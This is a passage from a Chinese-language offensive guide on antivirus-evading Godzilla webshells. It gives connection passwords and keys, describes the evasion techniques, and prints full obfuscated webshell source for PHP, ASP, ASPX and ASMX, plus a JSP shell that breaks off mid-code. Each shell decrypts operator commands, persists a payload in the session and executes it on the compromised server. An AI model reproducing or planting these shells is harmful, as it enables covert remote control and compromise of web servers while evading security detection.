## 四、免杀WebShell（Godzilla哥斯拉）

### 4.1 Godzilla连接配置

各语言WebShell的Godzilla连接参数：

| 类型 | 密码 | 密钥 | 有效载荷 | 加密器 |
|------|------|------|---------|--------|
| **ASP** | `Tas9er` | `qME87e` | AspDynamicPayload | ASP_XOR_BASE64 |
| **ASPX** | `Tas9er` | `PH3HO3qZytBgRwT` | CShapDynamicPayload | CSHAP_AES_BASE64 |
| **ASMX** | `Tas9er` | `FVvv` | CShapDynamicPayload | CSHAP_ASMX_AES_BASE64 |
| **PHP** | `Tas9er` | `5yTsw` | PhpDynamicPayload | PHP_XOR_BASE64 |
| **JSP** | `Tas9er` | `YeUJ` | JavaDynamicPayload | JAVA_AES_BASE64 |
| **JSPX** | `Tas9er` | `VsTF` | JavaDynamicPayload | JAVA_AES_BASE64 |

**免杀特征说明：**
- 所有函数名/变量名使用随机混淆命名
- 字符串拼接绕过关键字检测（`"sys"."tem"`、`Chr(XX)`拼接）
- 插入随机垃圾注释（如`/*fuckgovxxxxx*/`）
- 使用XOR/AES加密通信流量
- Session持久化机制
- 支持动态加载Payload（内存加载，不落盘）
- 响应前后添加固定md5分割标记（如`c0d751`和`cd2765`）

### 4.2 PHP免杀WebShell（Godzilla PHP_XOR_BASE64）

**特征：**
- 密码参数名通过字符运算动态生成（`("&"^"r").("7"^"V")...`）
- XOR加密+Base64编码
- Session持久化Payload
- 随机垃圾注释分割关键字
- Chr()函数拼接数字字符串
- @抑制错误

```php
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*fuckgovsgM07w3jd*/(Chr("48"));
function baiduYS37b(/*fuckgov8jHj8*/$baiduto7Tgxst,$baidub){
    for($baidu049dWkwJi=Chr("48");$baidu049dWkwJi<strlen($baiduto7Tgxst);$baidu049dWkwJi++) {
        $baidukH0XLu0GGbPk = $baidub[$baidu049dWkwJi+Chr("49")&15];
        $baiduto7Tgxst[$baidu049dWkwJi] = $baiduto7Tgxst[$baidu049dWkwJi]^$baidukH0XLu0GGbPk;
    }
    return $baiduto7Tgxst;
}
$baidun7JboDC9 = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_baiduYS37b = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$baidu1wzKJXP8fek=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baidun7JboDC9($baidun7JboDC9("Y2c9PQ=="));
$baiduQt='p'.$baidun7JboDC9($baidun7JboDC9("WVhsc2IyRms="));
$baidu8ffjKi0yUvaCM9p='ba6fb5e9'.$baidun7JboDC9("MWUyMjZkMDc=");
$baiduZhv8g3Ew0D=("!"^"@").'ss'.Chr("101").'rs';
$baiduZhv8g3Ew0D++;
if (isset($_POST/*fuckgovYsGxozblTdqCcF*/[$baidu1wzKJXP8fek])){
    $datbaiduZhv8g3Ew0D=baiduYS37b/*fuckgovv6Pnk31j*/($baidun7JboDC9($_POST[$baidu1wzKJXP8fek]),$baidu8ffjKi0yUvaCM9p);
    if (/*fuckgov84YP89l6MQj*/isset($_SESSION/*fuckgoviKC2FSv8oSi*/[$baiduQt])){
        $baiduk50=baiduYS37b($_SESSION/*fuckgovk*/[$baiduQt],$baidu8ffjKi0yUvaCM9p);
        if(/*fuckgovfVgPQn*/strpos($baiduk50,$baidun7JboDC9/*fuckgovcpsO7MDpxyKuCg9*/($baidun7JboDC9("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
            $baiduk50=baiduYS37b/*fuckgovMChbRBWzm4h*/($baiduk50,$baidu8ffjKi0yUvaCM9p);
        }
        define("baiducO7pe","//baiduhWAzEz3wYxr7\r\n".$baiduk50);
        $baiduZhv8g3Ew0D(baiducO7pe);
        echo substr(/*fuckgovVu6pkZ2tMrl*/md5/*fuckgovbMtDpRZBHLkg2fL*/($baidu1wzKJXP8fek.$baidu8ffjKi0yUvaCM9p),Chr("48"),16);
        echo $base64_baiduYS37b(baiduYS37b(@run($datbaiduZhv8g3Ew0D),$baidu8ffjKi0yUvaCM9p));
        echo substr(/*fuckgovEx66zlhC*/md5/*fuckgoviSGd*/($baidu1wzKJXP8fek.$baidu8ffjKi0yUvaCM9p),16);
    }else{
        if(strpos/*fuckgovokb1ktWWj*/($datbaiduZhv8g3Ew0D,$baidun7JboDC9($baidun7JboDC9("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
            $_SESSION[$baiduQt]=baiduYS37b($datbaiduZhv8g3Ew0D,$baidu8ffjKi0yUvaCM9p);
        }
    }
}
?>
```

### 4.3 ASP免杀WebShell（Godzilla ASP_XOR_BASE64）

**特征：**
- XOR加密+Base64编码，密钥`cda835a7de057d52`
- Scripting.Dictionary存储payload
- ADODB.Stream进行二进制/文本转换
- Chr()拼接绕过关键字检测
- Session持久化payload
- 随机垃圾注释`<!--"-->`和`<%'caonimaXXX%>`分割
- MD5响应标记：`c0d751`和`cd2765`
- 密码参数名通过Chr()拼接：`Tas9er`

```asp
Hello Administrator!
WelCome To Tas9er Godzilla ASP Console!
<%
Set shabi4W = SeRveR.CrEateObJeCt("Scr"&"ipti"&"ng.Di"&"ct"&"ion"&"ar"&Chr("121"))
<!--"-->
FunCtioN shabi1xTuqJJYdE(ByVal shabigyff)
	<!--"-->
    DIm shabiS, shabiwNH6KweBTlF6
    SEt shabiS = CReAteOBjeCt("Ms"&"xm"&"l"&Chr("50")&".DO"&"MDo"&"cume"&"nt.3."&Chr("48"))
	<!--"-->
    SeT shabiwNH6KweBTlF6 = shabiS.CreateElement("base"&Chr("54")&Chr("52"))
	<!--"-->
    shabiwNH6KweBTlF6.daTaTyPe = "bi"&"n.ba"&"se"&Chr("54")&Chr("52")
    shabiwNH6KweBTlF6.tExT = shabigyff
	<!--"-->
    shabi1xTuqJJYdE = shabiwNH6KweBTlF6.noDeTypeDVAlue
	<!--"-->
    SEt shabiwNH6KweBTlF6 = Nothing
	<!--"-->
    SeT shabiS = Nothing
EnD FunCTioN
%><%'caonimaVAxUNLR5FF%><%
FUNctIon shabiRXmLdTODUD7Y0i(shabirD60UrdOZKHtT,shabiwzR)
	<!--"-->
    diM shabijvgEME5g,shabiyA3cokwy,shabiGePxQQEqvk,shabiOi
    shabiOi = lEn(shabijisiDLbHbOBli)
	<!--"-->
    Set shabi5JpnlVt = CrEATeObjecT("AD"&"OD"&"B.St"&"re"&Chr("97")&Chr("109"))
	<!--"-->
    shabi5JpnlVt.ChArsET = "is"&"o-8"&"85"&"9-"&Chr("49")
    shabi5JpnlVt.TYPe = Chr("50")
    shabi5JpnlVt.OpeN
	<!--"-->
    if IsArray(shabirD60UrdOZKHtT) then
        shabijvgEME5g=UBoUNd(shabirD60UrdOZKHtT)+Chr("49")
		<!--"-->
        For shabiyA3cokwy=Chr("49") To shabijvgEME5g
            shabi5JpnlVt.WritETeXt chRw(asCB(mIDb(shabirD60UrdOZKHtT,shabiyA3cokwy,Chr("49"))) Xor Asc(MiD(shabijisiDLbHbOBli,(shabiyA3cokwy mOd shabiOi)+Chr("49"),Chr("49"))))
			<!--"-->
        Next
    end if
    shabi5JpnlVt.PoSItiOn = Chr("48")
	<!--"-->
    if shabiwzR then
        shabi5JpnlVt.TYpE = Chr("49")
		<!--"-->
        shabiRXmLdTODUD7Y0i=shabi5JpnlVt.ReAd()
		<!--"-->
    else
        shabiRXmLdTODUD7Y0i=shabi5JpnlVt.ReAdTeXt()
		<!--"-->
    end if
End Function
%><%'caonimaxeDxT21pbrHGHXL%><%
    shabijisiDLbHbOBli=Chr("99")&Chr("100")&Chr("97")&Chr("56")&Chr("51")&Chr("53")&Chr("97")&Chr("55")&Chr("100")&Chr("101")&Chr("48")&Chr("53")&Chr("55")&Chr("100")&Chr("53")&Chr("50")
	<!--"-->
    shabirD60UrdOZKHtT=reQUest.FoRm(Chr("84")&Chr("97")&Chr("115")&Chr("57")&Chr("101")&Chr("114"))
	<!--"-->
    if not IsEmpty(shabirD60UrdOZKHtT) then
        if  IsEmpty(SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))) then
            shabirD60UrdOZKHtT=shabiRXmLdTODUD7Y0i(shabi1xTuqJJYdE(shabirD60UrdOZKHtT),false)
			<!--"-->
            SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))=shabirD60UrdOZKHtT
			<!--"-->
            rEspOnsE.End
        else
            shabirD60UrdOZKHtT=shabiRXmLdTODUD7Y0i(shabi1xTuqJJYdE(shabirD60UrdOZKHtT),true)
			<!--"-->
            shabi4W.Add "p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"),SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))
			<!--"-->
            ExeCuTE(shabi4W("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100")))
            shabiGePxQQEqvk=rUn(shabirD60UrdOZKHtT)
			<!--"-->
            rEspOnsE.Write(Chr("99")&Chr("48")&Chr("100")&Chr("55")&Chr("53")&Chr("49"))
            if not IsEmpty(shabiGePxQQEqvk) then
                rEspOnsE.Write BaSe64EncOdE(shabiRXmLdTODUD7Y0i(shabiGePxQQEqvk,true))
				<!--"-->
            end if
			<!--"-->
            rEspOnsE.Write(Chr("99")&Chr("100")&Chr("50")&Chr("55")&Chr("54")&Chr("53"))
        end if
		<!--"-->
    end if
%>
```

### 4.4 ASPX免杀WebShell（Godzilla CSHAP_AES_BASE64）

**特征：**
- AES/MD5 CryptoServiceProvider加密
- Unicode转义`\u0053\u0079...`绕过关键字检测
- 随机`/*comment*/`垃圾注释
- MD5 Hash标记：`0c55696561d05585`（前后16字节分割）
- Assembly.Load动态加载Payload
- RijndaelManaged AES加解密
- Session持久化Payload

```aspx
Hello Administrator!
WelCome To Tas9er Godzilla ASP.NET Console!
<%@ PAge LaNgUagE="C#"%>
<%try {
string eduSQrtEIXh = \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067("VmtkR2VrOVhWbms9"))))));
string edu7onJtOQ1 = "0c55696561d05585";
string eduuEJaj5H7CkTBwhK = \u0053\u0079\u0073\u0074\u0065\u006D./*1XEYh2*/\u0042\u0069\u0074\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072/*m52TWNxXI*/.ToString(new /*HFHMtU*/\u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079/*NjkxdU*/.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079.\U0000004D\U00000044\U00000035\U00000043\U00000072\U00000079\U00000070\U00000074\U0000006F\U00000053\U00000065\U00000072\U00000076\U00000069\U00000063\U00000065\U00000050\U00000072\U0000006F\U00000076\U00000069\U00000064\U00000065\U00000072()/*7FbB*/.ComputeHash/*WpaZHFG1r4RiWRR*/(\u0053\u0079\u0073\u0074\u0065\u006D.Text./*cM2*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(eduSQrtEIXh + edu7onJtOQ1)))./*0SVJ*/Replace("-", "");
byte[] edu8gTAQ62a30bq = \u0053\u0079\u0073\u0074\u0065\u006D./*TCqH*/\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074/*OnA*/./*WDNKJuoD*/\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067/*G44arWob*/(Context.Request[eduSQrtEIXh]);
edu8gTAQ62a30bq = new \u0053\u0079\u0073\u0074\u0065\u006D/*SE3a3VKh*/.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079/*75663iV99wll*/./*ftwAr321*/\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()./*iyG3CmuMTZTq*/CreateDecryptor(\u0053\u0079\u0073\u0074\u0065\u006D./*z6yhMXksTX46*/Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default/*DvPzVIhChCPtLB*/.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1), \u0053\u0079\u0073\u0074\u0065\u006D.Text./*1AFutvR7h1Fol*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1))./*iPrNRNuJkvHLT50*/\U0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(edu8gTAQ62a30bq, 0, edu8gTAQ62a30bq.Length);
if (Context./*NE*/\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] == null)
{Context/*XWD8NXj*/.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] = (/*o2*/\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E./*8HHhJgjJU*/\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079)typeof(\u0053\u0079\u0073\u0074\u0065\u006D/*QmFxGC*/.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079).GetMethod("Load", new \u0053\u0079\u0073\u0074\u0065\u006D.Type[] { typeof(byte[]) })./*oTfJ7J*/Invoke(null, new object[] { edu8gTAQ62a30bq });;}
else { \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F./*4kOceF0af2AvBd*/MemoryStream eduJ91DEF = new \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F/*aU48w4NHrw*/.MemoryStream();
object eduB0s1yVgB3Rfk4Y = ((\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079/*mnwwV5hCxhI*/)Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E/*jJFGc0rAU5y9*/["payload"]).CreateInstance("LY");
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(Context);
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073/*9oUktVFidQ*/(eduJ91DEF);
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(edu8gTAQ62a30bq);
eduB0s1yVgB3Rfk4Y.ToString()/*Szj*//*OfQ*/;
byte[] edu1buAnHIPN = eduJ91DEF.ToArray();
Context.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065/*bcqXKvcuR82hHZ*/.Write(eduuEJaj5H7CkTBwhK.\u0053\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067(0, 16));
Context.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065.Write(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074./*sQ9jlg2FotQDfkH*/ToBase64String/*D57p*/(new \u0053\u0079\u0073\u0074\u0065\u006D./*5zQtPS*/\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079./*348rbtuxI9iv*/\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064().CreateEncryptor/*lp*/(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default/*gmivQ1zNXjxo1s*/.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1), \u0053\u0079\u0073\u0074\u0065\u006D.Text./*jO0Jgcrjz6Oai*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1)).\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B/*QoQ*/(edu1buAnHIPN, 0, edu1buAnHIPN.Length)));
Context/*RCpf*/.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065.Write(eduuEJaj5H7CkTBwhK.\u0053\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067(16));}}
catch (\u0053\u0079\u0073\u0074\u0065\u006D.Exception) {};
%>
```

### 4.5 ASMX免杀WebShell（Godzilla CSHAP_ASMX_AES_BASE64）

**特征：**
- WebService类封装，绕过普通.aspx检测
- URL Decode解码输入参数
- AES+MD5 RijndaelManaged加密
- StringBuilder输出构建
- Unicode转义+随机注释混淆
- MD5 Hash标记：`beafcd4071931fd1`
- Session持久化+Assembly.Load

```asmx
<%@ WebService LanGuagE="C#" Class="gov4HSZJhd" %>
public class gov4HSZJhd : \u0053\u0079\u0073\u0074\u0065\u006D.Web.\u0053\u0065\u0072\u0076\u0069\u0063\u0065\u0073.WebService
{
        [\u0053\u0079\u0073\u0074\u0065\u006D.Web./*FFDt*/\u0053\u0065\u0072\u0076\u0069\u0063\u0065\u0073.WebMethod(Enable\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E = true)]
        public string /*TljoI7KhiVT*/Tas9er(string Tas9er)
        {
			\u0053\u0079\u0073\u0074\u0065\u006D.Text./*XBTx*/\u0053\u0074\u0072\u0069\u006E\u0067\u0042\u0075\u0069\u006C\u0064\u0065\u0072 gov66RqifArBcgr = new \u0053\u0079\u0073\u0074\u0065\u006D/*TIY*/.Text.\u0053\u0074\u0072\u0069\u006E\u0067\u0042\u0075\u0069\u006C\u0064\u0065\u0072();
            try {
			string govybcCl7 = \u0053\u0079\u0073\u0074\u0065\u006D.Text.ASCII\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.ASCII\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067("VkdGek9XVnk="))));
			string govFejeEd6cBqjU = "beafcd4071931fd1";
			string govZ13qve = \u0053\u0079\u0073\u0074\u0065\u006D./*2G7eQzOC9hbXE8Y*/\u0042\u0069\u0074\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072/*UorfI2GseW*/.ToString(new \u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079./*QFm9TKPfURx*/\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079./*BBALytYNPN*/\U0000004D\U00000044\U00000035\U00000043\U00000072\U00000079\U00000070\U00000074\U0000006F\U00000053\U00000065\U00000072\U00000076\U00000069\U00000063\U00000065\U00000050\U00000072\U0000006F\U00000076\U00000069\U00000064\U00000065\U00000072()/*0HCmd7TXNUTps*/./*K*/ComputeHash/*RmA*/(\u0053\u0079\u0073\u0074\u0065\u006D./*yUibIGYz*/Text./*uTi9p0zhkqi*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govybcCl7 + govFejeEd6cBqjU)))./*Vu8fj4d2TAhDE*/Replace/*yB*/("-", "");
			byte[] govb7P29ocmreda = /*DkWF*/\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067/*M5pNoN*/(\u0053\u0079\u0073\u0074\u0065\u006D.Web.HttpUtility./*zsgTttVqna73X*/UrlDecode(Tas9er));
			govb7P29ocmreda = new \u0053\u0079\u0073\u0074\u0065\u006D./*cvliZ*/\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079./*0wy0qyNw9*/\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079.\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()/*BVNcMvXssW2QHv*/.CreateDecryptor/*BfvHs3ENfq*/(/*qhA*/\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067./*taZ001PTpMCdhj*/Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU), \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default./*jr2G*/\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU))./*s*/\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(govb7P29ocmreda, 0, govb7P29ocmreda.Length);
			if (/*8dAF*/Context./*XAMAoAGMaj*/\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] == null) 
			{ Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E/*2e*/["payload"] = (\u0053\u0079\u0073\u0074\u0065\u006D./*z*/\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E./*O6VI*/\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079)typeof(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079).GetMethod("Load", new \u0053\u0079\u0073\u0074\u0065\u006D/*ETAFAdRw*/.Type[] { typeof(byte[]) }).Invoke(null, new object[] { govb7P29ocmreda }); ; } 
			else { object govE7WmfbEA8dutE3 = ((\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E/*4e*/.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079/*jgAm4sZY320K*/)Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"]).CreateInstance("LY");
			\u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F./*VOkCG3sQZp4R3EW*/MemoryStream govWejcgP3V0gdGh = new \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F.MemoryStream();
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(Context);
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(govWejcgP3V0gdGh);
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(govb7P29ocmreda);
			govE7WmfbEA8dutE3.ToString()/*j*/;
			byte[] govT8 = govWejcgP3V0gdGh./*e7uAoYk9qOwI*/ToArray();
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064(govZ13qve.\u0053\u0075\u0062s\u0074\u0072\u0069\u006E\u0067(0, 16));
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064/*rN9nRXsOXUItS*/(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074./*6hsM*/ToBase64String/*Ug5T1NO*/(new \u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079/*5AL8O*/.\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()./*ZG*/CreateEncryptor(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU), \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU)).\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(govT8, 0, govT8.Length)));
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064(govZ13qve.\u0053\u0075\u0062s\u0074\u0072\u0069\u006E\u0067(16)); } }
			catch (\u0053\u0079\u0073\u0074\u0065\u006D/*vjLzdR4Dk*/.Exception) { }
			return gov66RqifArBcgr.ToString();
		}
}
```

### 4.6 JSP免杀WebShell（Godzilla JAVA_AES_BASE64）

**特征：**
- AES Cipher加解密，密钥`22f0962cf5a047d0`
- 自定义ClassLoader `defineClass`动态加载
- Session持久化Payload
- Base64解码器
- MD5响应标记：`06AD438AADCFF8FA6FFB85E3C0233924`（前后16字节）
- Unicode转义`\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073`
- 随机注释`/*edusb_XXX*/`分割关键字

```jsp
Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_hed = "22f0962cf5a047d0";
    String govsb_72 = "Tas9er";
    class govsb_qKamuqJcPde0n8u extends /*edusb_e7k3zS5MM0tp3*/ClassLoader {
        public govsb_qKamuqJcPde0n8u(ClassLoader govsb_kWMp7RD) {
            super/*edusb_agTMb73UY*/(govsb_kWMp7RD);
        }
        public Class govsb_0m(byte[] govsb_UjygAlgXEmVhu) {
            return super./*edusb_eOkdrfA*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_k*/(govsb_UjygAlgXEmVhu, 837575-837575, govsb_UjygAlgXEmVhu.length);
        }
    }
    public byte[] govsb_M0fZ0kevgRG(byte[] govsb_O0SB2EIXBcH, boolean govsb_am1fajbs) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_rm0I4tWk*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_OivaHoGWp = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_As4eRFXKp*/("AES");
            govsb_OivaHoGWp.init(govsb_am1fajbs?837575/837575:837575/837575+837575/837575,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_wyMNjd8C*/SecretKeySpec/*edusb_R*/(govsb_hed.getBytes(), "AES"));
